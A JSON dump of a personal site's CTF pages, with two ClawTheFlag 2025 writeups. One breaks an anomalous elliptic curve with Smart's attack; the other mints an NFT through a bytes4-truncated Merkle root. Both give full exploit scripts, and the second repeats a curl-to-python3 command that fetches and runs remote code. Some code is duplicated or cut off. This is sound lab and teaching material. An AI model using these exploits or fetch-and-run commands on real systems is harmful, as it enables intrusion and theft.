
[{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/tags/blockchain/","section":"Tags","summary":"","title":"Blockchain","type":"tags"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/","section":"CTFs","summary":"","title":"CLAWTHEFLAG Qualifications 2025","type":"ctfs"},{"content":"During the ClawTheFlag Qualifications CTF, I solved several challenges across different categories. This section documents how I approached each problem, the mistakes I made, and the techniques that ultimately led to the flag.\nThese writeups are meant both as a personal knowledge base and as a learning resource for anyone interested in CTFs.\nThanks to the Cybears team for fun and educational challenges üêªüé´\n","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/","section":"Writeups","summary":"","title":"CLAWTHEFLAG Qualifications 2025","type":"writeups"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/tags/cryptography/","section":"Tags","summary":"","title":"Cryptography","type":"tags"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"Ctf","type":"tags"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/ctfs/","section":"CTFs","summary":"","title":"CTFs","type":"ctfs"},{"content":"Challenge Name: Curved\nCategory: Cryptography\nCTF: ClawTheFlag\nDifficulty: Easy\nDescription: Just An other ecc challenge\nTL;DR # The curve was anomalous: its group order equals the prime field size ($#E(\\mathbb{F}_p) = p$). This enables Smart\u0026rsquo;s attack, letting us solve the ECDLP in linear time, recover Bob\u0026rsquo;s private key, derive the shared secret, and decrypt the flag.\nChallenge Artefacts # Script: server.py (provided) import json import os import hashlib from random import randint from Crypto.Cipher import AES from Crypto.Util.Padding import pad from sage.all import EllipticCurve, GF SECRET_FLAG = b\u0026#39;Cybears{fake_flag}\u0026#39; prime_mod = 98525254601464748798796659245875458879425316953529501999447929215987731776997 coeff_a = 0x1c456bfc3fabba99a737d7fd127eaa9661f7f02e9eb2d461d7398474a93a9b87 coeff_b = 0x8b429f4b9d14ed4307ee460e9f8764a1f276c7e5ce3581d8acd4604c2f0ee7ca curve = EllipticCurve(GF(prime_mod), [coeff_a, coeff_b]) base_point = curve.gens()[0] gx, gy = base_point.xy() def gen_key(): priv = randint(1, curve.order() - 1) pub = base_point * priv return pub, priv def calc_shared(pub_key, priv_key): point = pub_key * priv_key return point.xy()[0] def enc(secret): bob_pub, bob_priv = gen_key() bx, by = bob_pub.xy() alice_pub, alice_priv = gen_key() secret_value = calc_shared(bob_pub, alice_priv) key = hashlib.sha1(str(secret_value).encode()).digest()[:16] iv_bytes = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv_bytes) ciphertext_bytes = cipher.encrypt(pad(secret, 16)) payload = { \u0026#34;iv\u0026#34;: iv_bytes.hex(), \u0026#34;encrypted_flag\u0026#34;: ciphertext_bytes.hex(), \u0026#34;bob_public_key\u0026#34;: {\u0026#34;x\u0026#34;: hex(bx), \u0026#34;y\u0026#34;: hex(by)}, \u0026#34;alice_public_key\u0026#34;: {\u0026#34;x\u0026#34;: hex(alice_pub.xy()[0]), \u0026#34;y\u0026#34;: hex(alice_pub.xy()[1])}, \u0026#34;generator\u0026#34;: {\u0026#34;x\u0026#34;: hex(gx), \u0026#34;y\u0026#34;: hex(gy)} } return json.dumps(payload, indent=4) output_json = enc(SECRET_FLAG) print(output_json) # output # data = { # \u0026#34;iv\u0026#34;: \u0026#34;ee3991136f084b6b54fc03ea87d3309f\u0026#34;, # \u0026#34;encrypted_flag\u0026#34;: \u0026#34;a234a9b4e3140566f365660a6ad70af524d0c57819e8d5d52a80c0964e58583ffed62a06f14ea378ba773c831cb0a65d\u0026#34;, # \u0026#34;bob_public_key\u0026#34;: { # \u0026#34;x\u0026#34;: \u0026#34;0x499fa531c6e4c3726147ed0fd9c6529f1a12f0c783ff90747de9d82299aa20fb\u0026#34;, # \u0026#34;y\u0026#34;: \u0026#34;0x7f05d4fbab1b838661327e03a2077a7b1397038d56d74aae8d49749c393d2ea6\u0026#34; # }, # \u0026#34;alice_public_key\u0026#34;: { # \u0026#34;x\u0026#34;: \u0026#34;0x2404dc8f95e9203581f79188dada1f6738a7caf88d31a540d9e5c37f73d4f0cb\u0026#34;, # \u0026#34;y\u0026#34;: \u0026#34;0x2b3233a83e1ed08cdc55ed47887ac04aa6a24881f03646f12047c6e0e50ec8f6\u0026#34; # }, # \u0026#34;generator\u0026#34;: { # \u0026#34;x\u0026#34;: \u0026#34;0xad474d1a2709090faaf4ebf6ede7cb71c8917c60519ab581818716b9ad5969ae\u0026#34;, # \u0026#34;y\u0026#34;: \u0026#34;0x3fc125df9f61ac41fd36e257e31d0e8d33434ca32127d32ff40a53a41c7ab374\u0026#34; # } # } Output JSON (public info): iv: ee3991136f084b6b54fc03ea87d3309f encrypted_flag: a234...0a65d bob_public_key: (0x499f..., 0x7f05...) alice_public_key: (0x2404..., 0x2b32...) generator: (0xad47..., 0x3fc1...) Understanding the Scheme # Elliptic curve over $\\mathbb{F}_p$ with parameters coeff_a, coeff_b, and generator G. Key exchange: both parties generate ephemeral keys; shared secret is the x-coordinate of alice_priv * bob_pub. AES-CBC encryption uses key = SHA1(shared_x) truncated to 16 bytes; IV is random. Finding the Vulnerability # Compute curve discriminant to ensure non-singular (it is non-singular). Compute group order: order = curve.order(). Observation: order == p. Such curves are called anomalous curves. Anomalous curves are vulnerable to Smart\u0026rsquo;s attack, which reduces ECDLP to a linear-time computation via a p-adic lift. Why Smart\u0026rsquo;s Attack Works # For an anomalous curve, there is an isomorphism from the curve group to $(\\mathbb{Z}/p\\mathbb{Z}, +)$ obtained via a p-adic logarithm. After lifting points to $\\mathbb{Q}_p$, the discrete log n for Q = nP is recovered from p-adic coordinates of pP and pQ. Exploitation Steps # Set up the curve in Sage with the given parameters and public points. Run Smart\u0026rsquo;s attack to solve for Bob\u0026rsquo;s private key k_B from bob_pub = k_B * G. Derive shared secret: S = k_B * alice_pub; use the x-coordinate S.x. Derive AES key: key = SHA1(str(S.x))[:16]. Decrypt the ciphertext with AES-CBC using the provided IV. Key Scripts (high level) # smart_attack.sage: Implements Smart\u0026rsquo;s attack for the anomalous curve, outputs SECRET_VALUE = S.x. decrypt.py: Uses SECRET_VALUE to derive AES key and decrypt the flag. Solver (step-by-step) # Run Smart\u0026rsquo;s attack to recover the shared secret x-coordinate: sage smart_attack.sage from sage.all import * # Given parameters p = 98525254601464748798796659245875458879425316953529501999447929215987731776997 a = 0x1c456bfc3fabba99a737d7fd127eaa9661f7f02e9eb2d461d7398474a93a9b87 b = 0x8b429f4b9d14ed4307ee460e9f8764a1f276c7e5ce3581d8acd4604c2f0ee7ca # Output data gx = int(\u0026#34;0xad474d1a2709090faaf4ebf6ede7cb71c8917c60519ab581818716b9ad5969ae\u0026#34;, 16) gy = int(\u0026#34;0x3fc125df9f61ac41fd36e257e31d0e8d33434ca32127d32ff40a53a41c7ab374\u0026#34;, 16) bob_x = int(\u0026#34;0x499fa531c6e4c3726147ed0fd9c6529f1a12f0c783ff90747de9d82299aa20fb\u0026#34;, 16) bob_y = int(\u0026#34;0x7f05d4fbab1b838661327e03a2077a7b1397038d56d74aae8d49749c393d2ea6\u0026#34;, 16) alice_x = int(\u0026#34;0x2404dc8f95e9203581f79188dada1f6738a7caf88d31a540d9e5c37f73d4f0cb\u0026#34;, 16) alice_y = int(\u0026#34;0x2b3233a83e1ed08cdc55ed47887ac04aa6a24881f03646f12047c6e0e50ec8f6\u0026#34;, 16) # Create curve F = GF(p) E = EllipticCurve(F, [a, b]) G = E(gx, gy) bob_pub = E(bob_x, bob_y) alice_pub = E(alice_x, alice_y) print(f\u0026#34;Curve order: {E.order()}\u0026#34;) print(f\u0026#34;Prime p: {p}\u0026#34;) print(f\u0026#34;Anomalous: {E.order() == p}\u0026#34;) # Smart\u0026#39;s Attack for anomalous curves def smart_attack(P, Q, p): \u0026#34;\u0026#34;\u0026#34; Smart\u0026#39;s attack on anomalous curves. Given P and Q = n*P, returns n. \u0026#34;\u0026#34;\u0026#34; E = P.curve() # Lift curve to Qp (p-adic field) Qp_field = Qp(p, 2) # precision 2 # Get curve coefficients a4 = ZZ(E.a4()) a6 = ZZ(E.a6()) # Create curve over Qp Ep = EllipticCurve(Qp_field, [a4, a6]) # Hensel lift a point from E to Ep def hensel_lift(Pt): x_val = ZZ(Pt.xy()[0]) y_val = ZZ(Pt.xy()[1]) # y^2 = x^3 + a4*x + a6 # We need y\u0026#39; such that y\u0026#39;^2 ‚â° x^3 + a4*x + a6 (mod p^2) # Using Newton\u0026#39;s method: y\u0026#39; = y + t*p where t = (rhs - y^2)/(2*y*p) rhs = x_val^3 + a4 * x_val + a6 # t = (rhs - y_val^2) / (2 * y_val * p) # We need this mod p numerator = (rhs - y_val^2) // p # This should be an integer denominator = 2 * y_val t = ZZ(Mod(numerator, p) * Mod(denominator, p)^(-1)) y_lifted = y_val + t * p return Ep(Qp_field(x_val), Qp_field(y_lifted)) # Lift points P_lift = hensel_lift(P) Q_lift = hensel_lift(Q) # Compute p * P_lift and p * Q_lift pP = p * P_lift pQ = p * Q_lift # Get coordinates x_pP = pP.xy()[0] y_pP = pP.xy()[1] x_pQ = pQ.xy()[0] y_pQ = pQ.xy()[1] # The discrete log is: n = œÜ(Q) / œÜ(P) where œÜ is the p-adic log # For anomalous curves: œÜ(P) = -x(pP) / y(pP) # So n = (x(pQ)/y(pQ)) / (x(pP)/y(pP)) = x(pQ)*y(pP) / (x(pP)*y(pQ)) phi_P = -x_pP / y_pP phi_Q = -x_pQ / y_pQ n = phi_Q / phi_P return ZZ(n) % p print(\u0026#34;\\nRunning Smart\u0026#39;s attack...\u0026#34;) bob_priv = smart_attack(G, bob_pub, p) print(f\u0026#34;Bob\u0026#39;s private key: {bob_priv}\u0026#34;) # Verify if bob_priv * G == bob_pub: print(\u0026#34;Verification: bob_priv * G == bob_pub ‚úì\u0026#34;) else: print(\u0026#34;WARNING: Verification failed!\u0026#34;) # Try negative bob_priv = p - bob_priv if bob_priv * G == bob_pub: print(f\u0026#34;Corrected Bob\u0026#39;s private key: {bob_priv}\u0026#34;) print(\u0026#34;Verification after correction: ‚úì\u0026#34;) # Calculate shared secret shared_point = bob_priv * alice_pub shared_x = ZZ(shared_point.xy()[0]) print(f\u0026#34;\\nShared secret x-coordinate: {shared_x}\u0026#34;) print(f\u0026#34;\\n=== FOR DECRYPTION ===\u0026#34;) print(f\u0026#34;SECRET_VALUE = {shared_x}\u0026#34;) Expected important output:\nBob\u0026#39;s private key: \u0026lt;...\u0026gt; Verification: bob_priv * G == bob_pub ‚úì Shared secret x-coordinate: 70195069208381892934585902848485094050700408152976961917545624632484143189611 === FOR DECRYPTION === SECRET_VALUE = 70195069208381892934585902848485094050700408152976961917545624632484143189611 Decrypt with AES-CBC using that secret: python decrypt.py import hashlib from Crypto.Cipher import AES from Crypto.Util.Padding import unpad # Data from the challenge iv = bytes.fromhex(\u0026#34;ee3991136f084b6b54fc03ea87d3309f\u0026#34;) encrypted_flag = bytes.fromhex(\u0026#34;a234a9b4e3140566f365660a6ad70af524d0c57819e8d5d52a80c0964e58583ffed62a06f14ea378ba773c831cb0a65d\u0026#34;) # Shared secret x-coordinate from Smart\u0026#39;s attack SECRET_VALUE = 70195069208381892934585902848485094050700408152976961917545624632484143189611 # Derive key (same as in server.py) key = hashlib.sha1(str(SECRET_VALUE).encode()).digest()[:16] # Decrypt cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = unpad(cipher.decrypt(encrypted_flag), 16) print(f\u0026#34;FLAG: {plaintext.decode()}\u0026#34;) Expected output:\nFLAG: cybears{...} Math Notes (compact) # Anomalous condition: $#E(\\mathbb{F}_p) = p$. Smart\u0026rsquo;s attack recovers $n$ where $Q = nP$ via $$n \\equiv \\frac{-x(pQ)/y(pQ)}{-x(pP)/y(pP)} \\pmod p.$$ Final Flag # cybears{YOUR_ATTACK_IS_TOO_SMART!!!!} Takeaways # Never use anomalous curves in ECC; they collapse ECDLP hardness. Always validate curve parameters and group order; use standardized safe curves. Do not rely on home-rolled curves without security proofs or standard review. ","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/curved/","section":"Writeups","summary":"","title":"Curved - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Cybears Invite\nCategory: Blockchain\nCTF: ClawTheFlag\nDifficulty: Medium Description: Can you get your ticket to enter the finals?\nConnection: nc 13.61.1.167 31337\nTL;DR (Quick Solution) # The challenge uses a Merkle tree verification system with a critical flaw: the Merkle root is truncated to only 4 bytes (bytes4) instead of the standard 32 bytes (bytes32). This reduces the security from 256 bits to just 32 bits.\nThe exploit:\nThe Merkle root is 0xa9059cbb (only 4 bytes) This value equals bytes4(keccak256(\u0026quot;transfer(address,uint256)\u0026quot;)) - the ERC-20 transfer function selector With an empty proof array, the contract checks if bytes4(keccak256(secret)) == merkleRoot Using secret \u0026quot;transfer(address,uint256)\u0026quot; passes the check and mints the NFT Once minted, retrieve the flag using your instance UUID Flag: cybears{4lwAyS_cH3Ck_4RRay_lEnGtHS} (\u0026ldquo;Always check array lengths\u0026rdquo; - a hint about the truncation vulnerability!)\nChallenge Overview # This is a smart contract security challenge where you need to mint a \u0026ldquo;Cybears Finals Invitation\u0026rdquo; NFT by bypassing a Merkle proof verification system.\nWhat you get:\nA netcat endpoint that launches a private Ethereum blockchain instance Source code for several Solidity contracts A funded Ethereum account to interact with the contracts Your goal:\nMint an invitation NFT from the CybearsInvite contract Make Setup.isSolved() return true Retrieve the flag Files provided:\nCybearsInvite.sol ‚Äî Main contract with NFT minting logic and Merkle verification ERC721.sol ‚Äî Minimal ERC-721 NFT implementation MerkleProof.sol ‚Äî Custom (buggy) Merkle proof verification library Setup.sol ‚Äî Deployment contract that checks if challenge is solved Understanding Merkle Trees (Background) # Before diving into the vulnerability, let\u0026rsquo;s understand what Merkle trees are and why they\u0026rsquo;re used:\nWhat\u0026rsquo;s a Merkle Tree?\nA data structure that allows efficient verification of whether an element is part of a set Used in allowlists/whitelists to verify if an address is permitted to mint NFTs Instead of storing thousands of addresses on-chain (expensive!), you store just one 32-byte \u0026ldquo;root\u0026rdquo; hash How it normally works:\nBuild a tree of hashes off-chain from your allowlist Store only the root hash on-chain Users submit a \u0026ldquo;proof\u0026rdquo; (array of hashes) along with their data Contract verifies the proof against the root - if valid, they\u0026rsquo;re on the allowlist Standard security: Merkle roots are bytes32 (32 bytes = 256 bits), making collisions computationally infeasible (2^256 possibilities).\nThe Contracts Explained # Setup.sol (The Challenge Checker) contract Setup { address public immutable PLAYER_ADR; CybearsInvite public immutable cyb; constructor(address _playerAdr, bytes32 merkleRoot) { PLAYER_ADR = _playerAdr; cyb = new CybearsInvite(merkleRoot); } function isSolved() external view returns (bool) { return cyb.balanceOf(PLAYER_ADR) \u0026gt; 0; } } CybearsInvite.sol (The Vulnerable Contract) contract CybearsInvite is ERC721 { bytes4 private _merkleRoot; // ‚ö†Ô∏è ONLY 4 BYTES! Should be bytes32! uint public lastTokenId; mapping(string =\u0026gt; bool) private _minted; constructor(bytes32 _root) ERC721(\u0026#34;Cybears Finals Invitation\u0026#34;, \u0026#34;CybFInv\u0026#34;) { _merkleRoot = bytes4(_root); // ‚ö†Ô∏è Truncates 32 bytes to 4 bytes! } function mintInvite(bytes32[] calldata _proof, string memory secret) public { require(!hasMinted(secret), \u0026#34;Already minted\u0026#34;); require( MerkleProof.verify( _proof, _merkleRoot, bytes4(keccak256(abi.encodePacked(secret))) // ‚ö†Ô∏è Also truncated to 4 bytes ), \u0026#34;Invalid proof, are you sure you are invited?\u0026#34; ); _minted[secret] = true; ++lastTokenId; _mint(msg.sender, lastTokenId); } function hasMinted(string memory secret) public view returns (bool) { return _minted[secret]; } } The Critical Vulnerability:\n_merkleRoot is declared as bytes4 (4 bytes = 32 bits) instead of bytes32 (32 bytes = 256 bits) In the constructor, the 32-byte input is truncated: bytes4(_root) takes only the first 4 bytes This reduces security from 2^256 possibilities (impossible to brute force) to 2^32 possibilities (4.3 billion - potentially brute-forceable!) How the verification works:\nUser submits a _proof array and a secret string Contract computes bytes4(keccak256(secret)) - the first 4 bytes of the secret\u0026rsquo;s hash MerkleProof.verify() checks if this matches the Merkle root If the proof is empty and the hash matches, verification passes! _minted[secret] = true; ++lastTokenId; _mint(msg.sender, lastTokenId); } } The Merkle root is stored as bytes4, i.e., only the first 4 bytes of a 32‚Äëbyte root are kept. That cuts entropy from 256 bits to 32 bits. Verification compares bytes4(keccak256(secret)) (if proof is empty, the value remains the initial bytes4) with _merkleRoot. MerkleProof.sol (buggy assembly ‚Äî not needed for the exploit) # // SPDX-License-Identifier: Unlicense pragma solidity ^0.8.22; library MerkleProof { function verify(bytes32[] calldata proof, bytes4 root, bytes4 secret) internal pure returns (bool) { require(root != bytes32(0), \u0026#34;MerkleProof: Root cannot be zero\u0026#34;); require(secret != bytes32(0), \u0026#34;MerkleProof: Leaf cannot be zero\u0026#34;); assembly { let bytes_mask := 0xffffffff00000000000000000000000000000000000000000000000000000000 let proof_elements_ptr := add(proof.offset, 0x20) for { let i := 0 } lt(i, proof.length) { i := add(i, 1) } { let proofElement := calldataload(add(proof_elements_ptr, mul(i, 0x20))) if lt(secret, proofElement) { mstore(0x80, secret) mstore(0xa0, proofElement) } { mstore(0x80, proofElement) mstore(0xa0, secret) } let newHash := keccak256(0x80, 64) secret := and(newHash, bytes_mask) } } return secret == root; } } Finding the Vulnerability\nLet\u0026rsquo;s trace through what happens when we call mintInvite:\nContract receives: _proof array and secret string Computes: leaf = bytes4(keccak256(abi.encodePacked(secret))) Calls: MerkleProof.verify(_proof, _merkleRoot, leaf) If _proof is empty: Loop doesn\u0026rsquo;t execute, returns leaf == _merkleRoot If check passes: Mint NFT ‚úÖ The Attack Surface:\nWe need bytes4(keccak256(secret)) to equal the stored _merkleRoot The root is only 4 bytes, not 32 bytes We need to find what the root value is and find a matching secret The Solution # Discovery Process # Step 1: What is the Merkle root?\nWhen we get an instance, the Setup contract is deployed with a specific merkleRoot value. We can find this by:\nReading the contract creation transaction Examining contract storage Step 2: Launch Your Instance\nConnect to the challenge server and solve the Proof of Work (PoW):\nnc 13.61.1.167 31337 You\u0026rsquo;ll see a menu:\n1 - launch new instance 2 - kill instance 3 - get flag (if isSolved() is true) action? Type 1 and press Enter. You\u0026rsquo;ll get a PoW challenge:\n== PoW == sha256(\u0026#34;9604ed1193e3ed5e\u0026#34; + YOUR_INPUT) must start with 24 zeros in binary representation please run the following command to solve it: python3 \u0026lt;(curl -sSL https://minaminao.github.io/tools/solve-pow.py) 9604ed1193e3ed5e 24 YOUR_INPUT = Solve the PoW: Open a new terminal and run the suggested command:\npython3 \u0026lt;(curl -sSL https://minaminao.github.io/tools/solve-pow.py) 9604ed1193e3ed5e 24 Step 3: Verify the Secret\nLet\u0026rsquo;s confirm that \u0026quot;transfer(address,uint256)\u0026quot; produces the correct hash:\nfrom web3 import Web3 w3 = Web3() secret = \u0026#34;transfer(address,uint256)\u0026#34; hash_result = w3.keccak(text=secret) print(f\u0026#34;Secret: {secret}\u0026#34;) print(f\u0026#34;Full hash: {hash_result.hex()}\u0026#34;) print(f\u0026#34;First 4 bytes (bytes4): {hash_result[:4].hex()}\u0026#34;) Output:\nSecret: transfer(address,uint256) Full hash: 0xa9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b First 4 bytes (bytes4): a9059cbb Perfect! This matches the function selector for ERC-20 transfer.s will pass the Merkle verification and mint us an NFT!\nExploitation # with an empty proof (proof.length == 0), the loop never runs, and the verifier returns bytes4(keccak256(secret)) == root. That‚Äôs enough for us.\nAttack Strategy # Launch a new instance via the netcat launcher and solve the Proof of Work (PoW). Extract the merkleRoot value used in your instance: From the Setup constructor calldata (cleanest), or By inspecting storage (less reliable due to inheritance layout), or By spotting that the root equals 0xa9059cbb (ERC‚Äë20 transfer selector) as a deliberate hint. Realize that 0xa9059cbb == bytes4(keccak256(\u0026quot;transfer(address,uint256)\u0026quot;)). Call mintInvite with an empty proof [] and the secret string \u0026quot;transfer(address,uint256)\u0026quot;. Verify isSolved() and request the flag with your instance UUID. Step‚ÄëBy‚ÄëStep Exploitation # Launch instance and solve PoW Use netcat and the provided PoW solver. # Connect to the launcher nc 13.61.1.167 31337 # When prompted, run the recommended PoW solver locally python3 \u0026lt;(curl -sSL https://minaminao.github.io/tools/solve-pow.py) \u0026lt;CHALLENGE_HEX\u0026gt; 24 # Provide the solver\u0026#39;s YOUR_INPUT back to nc when asked On success, the server prints:\nuuid: your instance id rpc endpoint: your per‚Äëinstance RPC URL private key and your address: funded account challenge contract: the deployed Setup address Example output (yours will differ):\nuuid: ecc11475-e31c-4e6e-892d-c2f5b545c4c4 rpc endpoint: http://13.61.1.167:8545/ecc11475-e31c-4e6e-892d-c2f5b545c4c4 private key: 0xc5c0...e6f your address: 0x3F08...d87D challenge contract: 0x359A...1bFA Derive the Merkle root used There are multiple ways; the most faithful is decoding the Setup deployment transaction input to get the constructor args: (playerAddress, merkleRoot). Minimal Python (Web3) snippet to locate the Setup creation in recent blocks and read its input:\nfrom web3 import Web3 w3 = Web3(Web3.HTTPProvider(\u0026#39;\u0026lt;RPC_ENDPOINT\u0026gt;\u0026#39;)) setup_addr = \u0026#39;\u0026lt;SETUP_ADDRESS\u0026gt;\u0026#39; Write the Exploit Script Create a Python script to mint the NFT (save as mint_nft.py):\n#!/usr/bin/env python3 from web3 import Web3 import sys # Replace with YOUR instance credentials from Step 1 RPC_URL = \u0026#34;http://13.61.1.167:8545/ecc11475-e31c-4e6e-892d-c2f5b545c4c4\u0026#34; PRIVATE_KEY = \u0026#34;0xc5c0833a3181817c06130dd1405b01c06261d56da5bae076ad38a3b5eaa82e6f\u0026#34; YOUR_ADDRESS = \u0026#34;0x3F0837A0332E10E8F371783a9798088b915Ad87D\u0026#34; CHALLENGE_CONTRACT = \u0026#34;0x359A9678405C7923B246821DD5ded1f59d371bFA\u0026#34; # Connect to the blockchain w3 = Web3(Web3.HTTPProvider(RPC_URL)) print(\u0026#34;‚úì Connected to blockchain\\n\u0026#34;) # The secret that matches 0xa9059cbb! secret = \u0026#34;transfer(address,uint256)\u0026#34; print(f\u0026#34;Secret: \u0026#39;{secret}\u0026#39;\u0026#34;) print(f\u0026#34;Hash (first 4 bytes): {w3.keccak(text=secret)[:4].hex()}\\n\u0026#34;) # Contract ABIs (minimal - just what we need) setup_abi = [ {\u0026#34;inputs\u0026#34;:[],\u0026#34;name\u0026#34;:\u0026#34;cyb\u0026#34;,\u0026#34;outputs\u0026#34;:[{\u0026#34;internalType\u0026#34;:\u0026#34;contract CybearsInvite\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;address\u0026#34;}],\u0026#34;stateMutability\u0026#34;:\u0026#34;view\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;function\u0026#34;}, {\u0026#34;inputs\u0026#34;:[],\u0026#34;name\u0026#34;:\u0026#34;isSolved\u0026#34;,\u0026#34;outputs\u0026#34;:[{\u0026#34;internalType\u0026#34;:\u0026#34;bool\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;bool\u0026#34;}],\u0026#34;stateMutability\u0026#34;:\u0026#34;view\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;function\u0026#34;} ] invite_abi = [ {\u0026#34;inputs\u0026#34;:[ {\u0026#34;internalType\u0026#34;:\u0026#34;bytes32[]\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;_proof\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;bytes32[]\u0026#34;}, {\u0026#34;internalType\u0026#34;:\u0026#34;string\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;secret\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;string\u0026#34;} ],\u0026#34;name\u0026#34;:\u0026#34;mintInvite\u0026#34;,\u0026#34;outputs\u0026#34;:[],\u0026#34;stateMutability\u0026#34;:\u0026#34;nonpayable\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;function\u0026#34;} ] # Get contract instances setup = w3.eth.contract(address=CHALLENGE_CONTRACT, abi=setup_abi) cyb_address = setup.functions.cyb().call() invite = w3.eth.contract(address=cyb_address, abi=invite_abi) print(f\u0026#34;Setup contract: {CHALLENGE_CONTRACT}\u0026#34;) print(f\u0026#34;CybearsInvite contract: {cyb_address}\u0026#34;) print(\u0026#34;\\nMinting NFT...\\n\u0026#34;) # Build and send the mint transaction nonce = w3.eth.get_transaction_count(YOUR_ADDRESS) txn = invite.functions.mintInvite( [], # Empty proof array secret # The magic string ).build_transaction({ \u0026#39;from\u0026#39;: YOUR_ADDRESS, \u0026#39;nonce\u0026#39;: nonce, \u0026#39;gas\u0026#39;: 500000, \u0026#39;gasPrice\u0026#39;: w3.eth.gas_price }) # Sign and send signed = w3.eth.account.sign_transaction(txn, PRIVATE_KEY) tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction) print(f\u0026#34;Transaction sent: {tx_hash.hex()}\u0026#34;) print(\u0026#34;Waiting for confirmation...\u0026#34;) # Wait for the transaction to be mined receipt = w3.eth.wait_for_transaction_receipt(tx_hash) Get the Flag Now that isSolved() returns true, go back to the netcat session (or start a new one):\nnc 13.61.1.167 31337 Select option 3:\n1 - launch new instance 2 - kill instance 3 - get flag (if isSolved() is true) action? 3 Technical Deep Dive # Why Does This Work? # Let\u0026rsquo;s trace through the execution:\nWe call: mintInvite([], \u0026quot;transfer(address,uint256)\u0026quot;)\nContract computes:\nbytes4 leaf = bytes4(keccak256(abi.encodePacked(\u0026#34;transfer(address,uint256)\u0026#34;))) // Result: 0xa9059cbb Verification called:\nMerkleProof.verify( [], // Empty proof 0xa9059cbb, // Stored _merkleRoot (truncated from constructor) 0xa9059cbb // Our computed leaf ) Inside MerkleProof.verify:\nThe for loop condition lt(i, proof.length) is lt(0, 0) = false Loop body never executes Function returns secret == root ‚Üí 0xa9059cbb == 0xa9059cbb ‚Üí true ‚úì Verification passes! NFT is minted.\nThe Security Flaw # Normal Merkle trees:\nUse bytes32 (32 bytes = 256 bits) 2^256 possible values ‚âà 1.16 √ó 10^77 Computationally impossible to find collisions This challenge:\nUses bytes4 (4 bytes = 32 bits) 2^32 possible values = 4,294,967,296 Finding collisions is feasible! In fact, you could brute-force find ANY secret that hashes to match the 4-byte root The hint: The challenge creator chose 0xa9059cbb (the transfer function selector) as a big hint. It\u0026rsquo;s one of the most well-known 4-byte values in Ethereum!\nAlternative Approaches (What Didn\u0026rsquo;t Work) # Approach 1: Brute Force # You could theoretically brute-force 4 billion possibilities:\ntarget = bytes.fromhex(\u0026#39;a9059cbb\u0026#39;) for i in range(4_300_000_000): # ~4.3 billion secret = str(i) if w3.keccak(text=secret)[:4] == target: print(f\u0026#34;Found: {secret}\u0026#34;) break Problem: This takes hours/days without GPU acceleration or optimized code. Not practical for a CTF.\nApproach 2: Storage Reading # You could read the contract\u0026rsquo;s storage to find _merkleRoot:\n# CybearsInvite storage layout (including inherited ERC721) # Slot 0-3: ERC721 mappings # Slot 4-5: ERC721 strings (name, symbol) # Slot 6: bytes4 _merkleRoot (packed) storage = w3.eth.get_storage_at(cyb_address, 6) Problem: Storage layout with inheritance is tricky. The root is also packed in a slot, making extraction non-obvious.\nApproach 3: Exploit the MerkleProof Bug # The assembly bug where the second block always executes seems exploitable\u0026hellip; Lessons Learned\nKey Takeaways # Type matters! bytes4 vs bytes32 is a massive security difference\nbytes4: 32 bits = 4.3 billion possibilities (weak) bytes32: 256 bits = 1.16 √ó 10^77 possibilities (cryptographically secure) Truncation is dangerous\nConverting bytes32 ‚Üí bytes4 loses 224 bits of entropy Always use full-width types for security-critical values Know your function selectors\n0xa9059cbb is instantly recognizable to Ethereum developers Common selectors can be guessed or looked up Test edge cases\nWhat happens with an empty proof array? Does the verification logic handle it correctly? Use battle-tested libraries\nCustom assembly is error-prone (as seen in the buggy MerkleProof) OpenZeppelin\u0026rsquo;s libraries are audited and reliable How to Fix This # Vulnerable Code:\nbytes4 private _merkleRoot; // ‚ùå Only 4 bytes! constructor(bytes32 _root) { _merkleRoot = bytes4(_root); // ‚ùå Truncates! } Secure Code:\nbytes32 private _merkleRoot; // ‚úÖ Full 32 bytes constructor(bytes32 _root) { _merkleRoot = _root; // ‚úÖ No truncation } function mintInvite(bytes32[] calldata _proof, string memory secret) public { require( MerkleProof.verify( _proof, _merkleRoot, // ‚úÖ Compare full 32 bytes keccak256(abi.encodePacked(secret)) // ‚úÖ Full hash ), \u0026#34;Invalid proof\u0026#34; ); // ... mint logic } Better: Use OpenZeppelin:\nimport \u0026#34;@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\u0026#34;; function mintInvite(bytes32[] calldata _proof, string memory secret) public { bytes32 leaf = keccak256(abi.encodePacked(msg.sender, secret)); require( MerkleProof.verify(_proof, _merkleRoot, leaf), \u0026#34;Invalid proof\u0026#34; ); // ... mint logic } Tools \u0026amp; References # Tools Used # Web3.py: Python library for interacting with Ethereum\npip install web3 PoW Solver: Provided by the CTF organizers\npython3 \u0026lt;(curl -sSL https://minaminao.github.io/tools/solve-pow.py) \u0026lt;challenge\u0026gt; 24 Netcat: For connecting to the challenge server\nnc 13.61.1.167 31337 Important Ethereum Concepts # Function Selectors: First 4 bytes of keccak256(function_signature) Merkle Trees: Efficient data structure for proving set membership bytes4 vs bytes32: Fixed-size byte arrays in Solidity ABI Encoding: How function calls and data are encoded in Ethereum Common Function Selectors # 0xa9059cbb - transfer(address,uint256) 0x23b872dd - 